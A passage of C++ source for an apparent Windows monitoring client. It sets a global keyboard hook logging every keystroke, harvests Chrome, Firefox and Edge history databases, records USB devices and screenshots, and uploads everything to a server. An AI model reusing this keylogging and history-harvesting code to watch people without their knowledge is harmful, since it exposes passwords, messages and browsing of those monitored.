    data["MonitorId"] = selectedMonitorId.load();
    data["Username"] = username;
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastTicStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            writeDebugLog("Tic event sent successfully");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            writeDebugLog("Tic event error: " + errorMsg);
            connectionStatus.lastError = "Tic event: " + errorMsg;
        }
    }
    else {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastTicStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Tic event failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send browser histories
bool sendBrowserHistories() {
    if(selectedMonitorId.load()<1 || getClientToken().empty())return false;
    static std::atomic<bool> sending{false};
    if(sending.exchange(true))return false;
    struct ResetSending { std::atomic<bool>& state; ~ResetSending(){state.store(false);} } reset{sending};
    std::vector<Json::Value> batch;
    {
        std::lock_guard<std::mutex> lock(dataMutex);
        for(const auto& entry:browserHistories){
            if(batch.size()>=500)break;
            batch.push_back(entry);
        }
    }
    if(batch.empty())return true;
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "BrowserHistory";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["MonitorId"] = selectedMonitorId.load();
    data["Username"] = username;
    data["BrowserHistories"] = Json::Value(Json::arrayValue);
    
    for (const auto& history : batch) {
        data["BrowserHistories"].append(history);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            std::lock_guard<std::mutex> lock(dataMutex);
            // Acknowledge only the transmitted prefix; events captured while
            // the HTTP request was in flight remain queued.
            if(browserHistories.size()>=batch.size())
                browserHistories.erase(browserHistories.begin(),
                    browserHistories.begin()+static_cast<std::ptrdiff_t>(batch.size()));
            
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastHistoryStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            writeDebugLog("Browser history uploaded successfully");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            writeDebugLog("Browser history upload error: " + errorMsg);
            connectionStatus.lastError = "Browser history upload: " + errorMsg;
        }
    }
    else {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastHistoryStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Browser history upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send key logs
bool sendKeyLogs() {
    if(selectedMonitorId.load()<1 || getClientToken().empty())return false;
    static std::atomic<bool> sending{false};
    if(sending.exchange(true))return false;
    struct ResetSending { std::atomic<bool>& state; ~ResetSending(){state.store(false);} } reset{sending};
    std::vector<Json::Value> batch;
    {
        std::lock_guard<std::mutex> lock(dataMutex);
        for(const auto& entry:keyLogs){
            if(batch.size()>=2000)break;
            batch.push_back(entry);
        }
    }
    if(batch.empty())return true;
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "KeyLog";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["MonitorId"] = selectedMonitorId.load();
    data["Username"] = username;
    data["KeyLogs"] = Json::Value(Json::arrayValue);
    
    for (const auto& keyLog : batch) {
        data["KeyLogs"].append(keyLog);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            std::lock_guard<std::mutex> lock(dataMutex);
            // Acknowledge only the transmitted prefix; events captured while
            // the HTTP request was in flight remain queued.
            if(keyLogs.size()>=batch.size())
                keyLogs.erase(keyLogs.begin(),
                    keyLogs.begin()+static_cast<std::ptrdiff_t>(batch.size()));
            
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastKeyLogStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            writeDebugLog("Key logs uploaded successfully");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            writeDebugLog("Key log upload error: " + errorMsg);
            connectionStatus.lastError = "Key log upload: " + errorMsg;
        }
    }
    else {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastKeyLogStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Key log upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send USB logs
bool sendUSBLogs() {
    if(selectedMonitorId.load()<1 || getClientToken().empty())return false;
    static std::atomic<bool> sending{false};
    if(sending.exchange(true))return false;
    struct ResetSending { std::atomic<bool>& state; ~ResetSending(){state.store(false);} } reset{sending};
    std::vector<Json::Value> batch;
    {
        std::lock_guard<std::mutex> lock(dataMutex);
        for(const auto& entry:usbDeviceLogs){
            if(batch.size()>=500)break;
            batch.push_back(entry);
        }
    }
    if(batch.empty())return true;
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "USBLog";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["MonitorId"] = selectedMonitorId.load();
    data["Username"] = username;
    data["USBLogs"] = Json::Value(Json::arrayValue);
    
    for (const auto& usbLog : batch) {
        data["USBLogs"].append(usbLog);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    
    std::string response = httpPost(url, jsonData);
    
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            std::lock_guard<std::mutex> lock(dataMutex);
            // Acknowledge only the transmitted prefix; events captured while
            // the HTTP request was in flight remain queued.
            if(usbDeviceLogs.size()>=batch.size())
                usbDeviceLogs.erase(usbDeviceLogs.begin(),
                    usbDeviceLogs.begin()+static_cast<std::ptrdiff_t>(batch.size()));
            
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastUSBLogStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            writeDebugLog("USB logs uploaded successfully");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            writeDebugLog("USB log upload error: " + errorMsg);
            connectionStatus.lastError = "USB log upload: " + errorMsg;
        }
    }
    else {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastUSBLogStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "USB log upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Update username on server
bool updateUsername(const std::string& newUsername) {
    std::string url = API_BASE_URL + API_ROUTE + "?type=username";
    
    Json::Value data;
    data["username"] = newUsername;
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            username = newUsername;  // Update local username
            // Username updated successfully
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            // Username update error
        }
    }
    
    // Failed to update username
    return false;
}

// HTTP POST request - optimized with shorter timeouts
std::string httpPost(const std::string& url, const std::string& data) {
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return "";
    }
    
    // Set shorter timeouts to prevent long blocking (5 seconds max)
    DWORD timeout = 5000; // 5 seconds - reduced from 10
    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    
    // Parse URL to get host and path
    URL_COMPONENTSA urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = -1;
    urlComp.dwHostNameLength = -1;
    urlComp.dwUrlPathLength = -1;
    urlComp.dwExtraInfoLength = -1;
    
    if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    std::string hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if(urlComp.dwExtraInfoLength)
        urlPath.append(urlComp.lpszExtraInfo,urlComp.dwExtraInfoLength);
    
    // Connecting to host
    
    // Connect to host
    HINTERNET hConnect = InternetConnectA(hInternet, hostName.c_str(), 
                                        urlComp.nPort == INTERNET_INVALID_PORT_NUMBER ? INTERNET_DEFAULT_HTTP_PORT : urlComp.nPort,
                                        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Open request
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath.c_str(), NULL, NULL, NULL, 
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | (urlComp.nScheme==INTERNET_SCHEME_HTTPS?INTERNET_FLAG_SECURE:0), 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Set headers
    std::string headers = "Content-Type: application/json\r\n";
    std::string tokenCopy=getClientToken();
    if(!tokenCopy.empty())headers += "Authorization: Bearer "+tokenCopy+"\r\n";
    HttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
    
    // Send request
    BOOL result = HttpSendRequestA(hRequest, NULL, 0, (LPVOID)data.c_str(), data.length());
    if(!result) {
        writeDebugLog("HTTP JSON request failed: WinINet error "+std::to_string(GetLastError()));
    } else {
        DWORD statusCode=0, statusSize=sizeof(statusCode);
        if(HttpQueryInfoA(hRequest,HTTP_QUERY_STATUS_CODE|HTTP_QUERY_FLAG_NUMBER,
                &statusCode,&statusSize,nullptr) && statusCode>=400)
            writeDebugLog("HTTP JSON request rejected: status "+std::to_string(statusCode)+
                " endpoint "+urlPath);
    }
    
    std::string response;
    if (result) {
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
        // HTTP request successful
    } else {
        // Failed to send HTTP request
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return response;
}

// HTTP POST file upload
std::string httpPostFile(const std::string& url, const std::string& filePath) {
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";
    
    // Parse URL to get host and path
    URL_COMPONENTSA urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = -1;
    urlComp.dwHostNameLength = -1;
    urlComp.dwUrlPathLength = -1;
    urlComp.dwExtraInfoLength = -1;
    
    if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    std::string hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if(urlComp.dwExtraInfoLength)
        urlPath.append(urlComp.lpszExtraInfo,urlComp.dwExtraInfoLength);
    
    // Connect to host
    HINTERNET hConnect = InternetConnectA(hInternet, hostName.c_str(), 
                                        urlComp.nPort == INTERNET_INVALID_PORT_NUMBER ? INTERNET_DEFAULT_HTTP_PORT : urlComp.nPort,
                                        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Read file
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }
    
    std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    // Create multipart form data
    std::string boundary = "----WebKitFormBoundary" + std::to_string(GetTickCount());
    std::string contentType = "multipart/form-data; boundary=" + boundary;
    
    std::string formData = "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"imagefile\"; filename=\"" + filePath + "\"\r\n";
    formData += "Content-Type: image/jpeg\r\n\r\n";
    formData += fileContent + "\r\n";
    
    // Add computer name to form data
    formData += "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"com_name\"\r\n\r\n";
    formData += username + "\r\n";
    
    // Include the selected monitor ID; backend checks it against the token.
    formData += "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"monitor_id\"\r\n\r\n";
    formData += std::to_string(selectedMonitorId.load()) + "\r\n";
    // Add capture time to form data
    formData += "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"ctime\"\r\n\r\n";
    formData += getWireDateTimeString() + "\r\n";
    
    formData += "--" + boundary + "--\r\n";
    
    // Create HTTP request
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath.c_str(), NULL, NULL, NULL, 
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | (urlComp.nScheme==INTERNET_SCHEME_HTTPS?INTERNET_FLAG_SECURE:0), 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Set headers
    std::string headers = "Content-Type: " + contentType + "\r\n";
    std::string tokenCopy=getClientToken();
    if(!tokenCopy.empty())headers += "Authorization: Bearer "+tokenCopy+"\r\n";
    HttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
    
    // Send request
    BOOL result = HttpSendRequestA(hRequest, NULL, 0, (LPVOID)formData.c_str(), formData.length());
    if(!result)
        writeDebugLog("Screenshot HTTP send failed (WinINet error "+std::to_string(GetLastError())+")");
    if(result) {
        DWORD statusCode=0, statusSize=sizeof(statusCode);
        if(HttpQueryInfoA(hRequest,HTTP_QUERY_STATUS_CODE|HTTP_QUERY_FLAG_NUMBER,
                &statusCode,&statusSize,nullptr) && statusCode>=400)
            writeDebugLog("Screenshot upload HTTP status "+std::to_string(statusCode));
    }
    
    std::string response;
    if (result) {
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return response;
}

// Keyboard hook procedure - optimized to reduce blocking
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            
            // Prepare data outside of critical section
            std::string application = getActiveWindowTitle();
            std::string keyName = getKeyName(kbStruct->vkCode, kbStruct->scanCode, kbStruct->flags);
            std::string timestamp = getWireDateTimeString();
            
            // Check for modifier keys
            std::string modifiers;
            if (GetAsyncKeyState(VK_CONTROL) & 0x8000) modifiers += "Ctrl+";
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) modifiers += "Shift+";
            if (GetAsyncKeyState(VK_MENU) & 0x8000) modifiers += "Alt+";
            if (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000) modifiers += "Win+";
            
            std::string fullKeyName = modifiers + keyName;
            
            // Create key log entry
            Json::Value keyLog;
            keyLog["date"] = timestamp;
            keyLog["application"] = application;
            keyLog["key"] = fullKeyName;
            
            // Minimize time spent in critical section
            bool shouldManageMemory = false;
            {
                std::lock_guard<std::mutex> lock(dataMutex);
                keyLogs.push_back(keyLog);
                
                // Check memory limits less frequently to reduce overhead
                if (keyLogs.size() % 50 == 0) { // Reduced from 100
                    shouldManageMemory = true;
                }
            }
            
            // Manage memory outside of critical section
            if (shouldManageMemory) {
                manageMemoryLimits();
            }
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Setup keyboard hook
void setupKeyboardHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        std::cerr << "Failed to set keyboard hook" << std::endl;
    }
}

// Remove keyboard hook
void removeKeyboardHook() {
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
}

// Collect browser history (optimized)
void collectBrowserHistory() {
    // Chrome history
    std::string chromeHistory = getChromeHistory(lastChromeFetch);
    if (!chromeHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(chromeHistory, historyArray)) {
            int64_t maxTime = lastChromeFetch;
            std::vector<Json::Value> newHistories;
            
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Chrome";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getWireDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                newHistories.push_back(history);
            }
            
            // Batch add to avoid frequent lock acquisitions
            if (!newHistories.empty()) {
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.insert(browserHistories.end(), newHistories.begin(), newHistories.end());
                
                // Check memory limits
                if (browserHistories.size() > MAX_BROWSER_HISTORIES) {
                    manageMemoryLimits();
                }
            }
            
            // Update the last fetch time
            if (maxTime > lastChromeFetch) {
                lastChromeFetch = maxTime;
                // Updated Chrome last fetch time
            }
        }
    }
    
    // Firefox history
    std::string firefoxHistory = getFirefoxHistory(lastFirefoxFetch);
    if (!firefoxHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(firefoxHistory, historyArray)) {
            int64_t maxTime = lastFirefoxFetch;
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Firefox";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getWireDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.push_back(history);
            }
            // Update the last fetch time
            if (maxTime > lastFirefoxFetch) {
                lastFirefoxFetch = maxTime;
                // Updated Firefox last fetch time
            }
        }
    }
    
    // Edge history
    std::string edgeHistory = getEdgeHistory(lastEdgeFetch);
    if (!edgeHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(edgeHistory, historyArray)) {
            int64_t maxTime = lastEdgeFetch;
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Edge";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getWireDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.push_back(history);
            }
            // Update the last fetch time
            if (maxTime > lastEdgeFetch) {
                lastEdgeFetch = maxTime;
                // Updated Edge last fetch time
            }
        }
    }
}

// Get Chrome history
std::string getChromeHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* localAppData;
    size_t len;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    std::string chromePath = std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\History";
    free(localAppData);
#else
    const char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return "";
    std::string chromePath = std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\History";
#endif
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_chrome_history.db";
    if (!CopyFileA(chromePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = chromePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
        // Chrome query with sinceTime
    } else {
        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
        // Chrome query without sinceTime (first run)
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != chromePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Get Firefox history
std::string getFirefoxHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* appData;
    size_t len;
    _dupenv_s(&appData, &len, "APPDATA");
    if (!appData) return "";
    std::string firefoxPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
    free(appData);
#else
    const char* appData = getenv("APPDATA");
    if (!appData) return "";
    std::string firefoxPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
#endif
    
    // Find all profiles, prefer default profile
    std::string profilePath;
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((firefoxPath + "\\*.default*").c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        // Found default profile
        profilePath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
        FindClose(hFind);
    } else {
        // Try to find any profile
        hFind = FindFirstFileA((firefoxPath + "\\*").c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::string testPath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
                    if (GetFileAttributesA(testPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                        profilePath = testPath;
                        break;
                    }
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    if (profilePath.empty()) {
        return "";
    }
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_firefox_history.db";
    if (!CopyFileA(profilePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = profilePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL AND last_visit_date > " + std::to_string(sinceTime) + " ORDER BY last_visit_date DESC LIMIT 100";
        // Firefox query with sinceTime
    } else {
        query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 100";
        // Firefox query without sinceTime (first run)
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != profilePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Get Edge history
std::string getEdgeHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* localAppData;
    size_t len;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    std::string edgePath = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\History";
    free(localAppData);
#else
    const char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return "";
    std::string edgePath = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\History";
#endif
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_edge_history.db";
    if (!CopyFileA(edgePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = edgePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
        // Edge query with sinceTime
    } else {
        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
        // Edge query without sinceTime (first run)
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != edgePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Main monitoring task - optimized to prevent blocking
void monitorTask() {
    auto lastScreenshot = std::chrono::steady_clock::now();
    auto lastTic = std::chrono::steady_clock::now();
    auto lastHistory = std::chrono::steady_clock::now();
    auto lastKeyLog = std::chrono::steady_clock::now();
    auto lastUSBLog = std::chrono::steady_clock::now();
    auto lastConnectionTest = std::chrono::steady_clock::now();
    auto lastMemoryCheck = std::chrono::steady_clock::now();

    std::this_thread::sleep_for(std::chrono::seconds(5));
    
    // Test initial connection
    if (!testServerConnection()) {
        showConnectionError("Cannot connect to server: " + API_BASE_URL);
    }

    // Send initial data requests within 5 seconds of startup
    if(selectedMonitorId.load()>0)sendInitialDataRequests();
    
    while (activeRunning) {
        if(selectedMonitorId.load()<1){std::this_thread::sleep_for(std::chrono::seconds(1));continue;}
        auto now = std::chrono::steady_clock::now();
        
        // Test connection every 120 seconds (reduced frequency)
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastConnectionTest).count() >= 120) {
            std::thread([]() { testServerConnection(); }).detach();
            lastConnectionTest = now;
        }
        
        // Screenshot - run in separate thread to prevent blocking
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastScreenshot).count() >= screenInterval) {
            std::thread([]() {
                std::string screenshotPath = takeScreenshot();
                sendScreenshot(screenshotPath);
            }).detach();
            lastScreenshot = now;
        }
        
        // Tic event (using dynamic interval from server) - run in separate thread
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastTic).count() >= ticInterval) {
            std::thread([]() { sendTicEvent(); }).detach();
            lastTic = now;
        }
        
        // Browser history - run in separate thread (using configurable interval)
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastHistory).count() >= historyInterval) {
            std::thread([]() {
                collectBrowserHistory();
                sendBrowserHistories();
            }).detach();
            lastHistory = now;
        }
        
        // Key logs - run in separate thread (using configurable interval)
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastKeyLog).count() >= keyInterval) {
            std::thread([]() { sendKeyLogs(); }).detach();
            lastKeyLog = now;
        }
        
        // USB logs - run in separate thread (using configurable interval)
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastUSBLog).count() >= usbInterval) {
            std::thread([]() { sendUSBLogs(); }).detach();
            lastUSBLog = now;
        }
        
